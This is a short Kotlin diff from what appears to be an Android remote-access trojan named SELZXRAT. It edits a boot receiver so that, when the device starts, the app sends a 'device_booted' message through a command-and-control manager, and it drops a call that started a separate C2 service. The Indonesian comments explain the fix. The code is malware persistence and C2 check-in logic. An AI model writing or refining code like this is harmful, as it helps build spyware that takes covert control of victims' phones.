@@ -14,14 +14,11 @@ class BootReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action == Intent.ACTION_BOOT_COMPLETED || intent.action == Intent.ACTION_REBOOT) {
-            Log.d(TAG, "Device booted — starting SELZXRAT services")
-            C2Manager.sendCommand("self", "device_booted", "")
+            Log.d(TAG, "Device booted — SELZXRAT controller ready")
 
-            // Panggil langsung dengan nama package lengkap untuk menghindari error Unresolved
-            val serviceIntent = Intent(context, com.selzxrat.v5.services.TargetC2Service::class.java).apply {
-                action = "restart"
-            }
-            context.startService(serviceIntent)
+            // 🔥 FIX: Hapus referensi TargetC2Service yang udah dihapus
+            // Controller gak perlu service — C2Manager udah cukup
+            C2Manager.sendCommand("self", "device_booted", "")
         }
     }
 }
